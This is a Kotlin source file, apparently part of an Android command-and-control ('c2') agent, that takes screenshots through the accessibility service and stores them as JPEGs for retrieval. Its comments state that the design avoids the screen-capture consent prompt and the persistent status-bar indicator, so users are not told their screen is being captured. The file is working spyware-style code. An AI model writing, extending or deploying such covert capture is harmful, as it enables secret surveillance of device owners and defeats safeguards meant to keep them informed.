package com.outcome.c2

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.graphics.ColorSpace
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Environment
import android.view.Display
import org.json.JSONObject
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * Screen capture that does not need a MediaProjection consent dialog.
 *
 * `AccessibilityService.takeScreenshot()` (API 30+) returns the whole display,
 * so the "enable screen capture" prompt and its persistent status-bar
 * indicator can both be avoided entirely — provided the accessibility service
 * is enabled, which this agent already requires.
 *
 * The MediaProjection path stays available as a fallback because it works down
 * to API 24. Recording has no equivalent here: there is no accessibility API
 * for video, so `screen_record` genuinely does require consent.
 */
object AccessibilityScreenshot {

    private const val TAG = "AccScreenshot"
    private const val TIMEOUT_MS = 8000L
    private const val JPEG_QUALITY = 80

    @Volatile
    private var service: AccessibilityService? = null

    private val executor = Executors.newSingleThreadExecutor { r ->
        Thread(r, "c2-accshot").apply { isDaemon = true }
    }

    /** Called from the accessibility service's onServiceConnected. */
    fun attach(instance: AccessibilityService?) {
        service = instance
    }

    fun isAvailable(): Boolean =
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && service != null

    fun status(): JSONObject {
        return JSONObject().apply {
            put("sdk", Build.VERSION.SDK_INT)
            put("service_bound", service != null)
            put("supported", Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            // AccessibilityService has no isEnabled(). A non-null reference
            // means onServiceConnected fired, which Android only delivers to a
            // service the user actually enabled, so binding is the signal.
            put("enabled", service != null)
        }
    }

    /**
     * Capture the default display. Returns a JSON result; on success it carries
     * `path`, `filename`, `size` and `width`/`height`.
     */
    fun capture(ctx: Context, timeoutMs: Long = TIMEOUT_MS): JSONObject {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return JSONObject().put(
                "error", "accessibility_screenshot_needs_android_11"
            )
        }
        // A bound instance is itself the proof the user enabled the service: Android
        // only calls onServiceConnected for an enabled accessibility service.
        val svc = service
            ?: return JSONObject().put("error", "accessibility_service_not_bound")

        val latch = CountDownLatch(1)
        var payload: JSONObject? = null

        try {
            svc.takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                        try {
                            payload = writeResult(ctx, screenshot)
                        } catch (e: Throwable) {
                            payload = JSONObject()
                                .put("error", e.message ?: "bitmap_failed")
                        } finally {
                            // getHardwareBuffer() exists from API 30, which is the
                            // same floor as takeScreenshot itself — so there is
                            // no version gate here. Gating on 31 leaked the
                            // buffer on exactly API 30.
                            try {
                                screenshot.hardwareBuffer?.close()
                            } catch (_: Throwable) {
                            }
                            latch.countDown()
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        payload = JSONObject()
                            .put("error", "take_screenshot_failed")
                            .put("error_code", errorCode)
                        latch.countDown()
                    }
                }
            )
        } catch (e: Throwable) {
            return JSONObject().put("error", e.message ?: "take_screenshot_unavailable")
        }

        if (!latch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
            return JSONObject().put("error", "screenshot_timeout")
        }

        return payload ?: JSONObject().put("error", "screenshot_no_result")
    }

    private fun writeResult(ctx: Context, screenshot: AccessibilityService.ScreenshotResult): JSONObject {
        val bitmap = toSoftwareBitmap(screenshot)
            ?: return JSONObject().put("error", "bitmap_unavailable")

        val dir = File(
            ctx.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                ?: ctx.filesDir,
            "screenshots"
        )
        if (!dir.exists() && !dir.mkdirs()) {
            bitmap.recycle()
            return JSONObject().put("error", "screenshot_dir_failed")
        }

        val file = File(dir, "shot_${System.currentTimeMillis()}.jpg")
        file.outputStream().use { out ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
        }
        val w = bitmap.width
        val h = bitmap.height
        bitmap.recycle()

        return JSONObject().apply {
            put("ok", true)
            put("filename", file.name)
            put("path", file.absolutePath)
            put("size", file.length())
            put("width", w)
            put("height", h)
            put("source", "accessibility")
        }
    }

    /**
     * `ScreenshotResult` exposes a HardwareBuffer, not a Bitmap — there is no
     * getBitmap() to fall back on. The documented route is
     * `Bitmap.wrapHardwareBuffer`, which yields a bitmap backed by the buffer
     * and therefore not directly JPEG-encodable, hence the copy out.
     */
    private fun toSoftwareBitmap(screenshot: AccessibilityService.ScreenshotResult): Bitmap? {
        val hw: HardwareBuffer = screenshot.hardwareBuffer ?: return null
        val colorSpace: ColorSpace = screenshot.colorSpace
            ?: ColorSpace.get(ColorSpace.Named.SRGB)
        val wrapped = Bitmap.wrapHardwareBuffer(hw, colorSpace) ?: return null
        val software = wrapped.copy(Bitmap.Config.ARGB_8888, false)
        wrapped.recycle()
        return software
    }
}
